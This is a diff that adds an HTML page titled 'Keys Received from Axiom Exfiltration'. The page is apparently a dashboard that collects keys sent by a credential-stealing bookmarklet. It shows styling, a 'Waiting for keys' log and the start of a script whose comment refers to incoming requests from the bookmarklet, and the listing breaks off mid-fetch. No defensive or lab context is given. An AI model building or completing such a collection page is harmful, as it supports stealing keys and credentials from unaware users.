@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🔑 Keys Received from Axiom Exfiltration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .log {
+            background-color: #fff;
+            padding: 20px;
+            border-left: 4px solid #007BFF;
+            margin-top: 20px;
+            white-space: pre-wrap;
+            font-family: monospace;
+            line-height: 1.5;
+        }
+        .status {
+            color: green;
+            font-weight: bold;
+        }
+        .received {
+            background-color: #e8f4fc;
+            padding: 10px;
+            border-radius: 6px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔑 Keys Received from Axiom Exfiltration</h1>
+
+    <div id="log" class="log">
+        <p><span class="status">Waiting for keys...</span></p>
+    </div>
+
+    <div class="received" id="lastReceived">
+        <strong>Last received:</strong> — none yet.
+    </div>
+
+    <script>
+        // Listen for incoming GET requests (from the bookmarklet)
+        const url = new URL(window.location.href);
+        let lastData = "";
+
+        function handleIncomingKeys() {
+            try {
+                if (!window.fetch) throw new Error("fetch not available");
+
+                fetch(url.origin + "/ex
